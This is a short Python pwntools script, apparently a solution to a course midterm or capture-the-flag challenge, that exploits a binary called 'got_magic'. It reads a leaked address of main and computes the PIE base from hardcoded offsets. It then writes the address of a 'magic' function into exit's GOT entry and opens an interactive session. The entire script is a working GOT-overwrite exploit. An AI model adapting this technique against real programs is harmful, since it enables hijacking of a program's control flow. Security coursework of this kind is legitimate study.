from pwn import *

#conn = remote('aup.zoolab.org', 38153)
conn = process('../src/got_magic')

conn.recvline()

main_addr = conn.recvline().decode().split(' ')[3]
main_addr = int(main_addr, 16) # str to int
print("main_addr -> %x" %main_addr)

'''
midterm env offset
main     -> 0xc7e
magic    -> 0xc5a
exit_got -> 0x202080
'''
'''
my env offset
main     -> 0x8c0
magic    -> 0x89c
exit_got -> 0x201040
'''
main_offset = 0x8c0
magic_offset = 0x89c
exit_got_offset = 0x201040


base = main_addr - main_offset
magic_addr = base + magic_offset
exit_got_addr = base + exit_got_offset

print("magic_addr -> %x" %magic_addr)
print("exit_got_addr -> %x" %exit_got_addr)

conn.recvuntil('?')
conn.sendline(str(exit_got_addr))
conn.recvuntil('?')
conn.sendline(str(magic_addr))

conn.interactive()


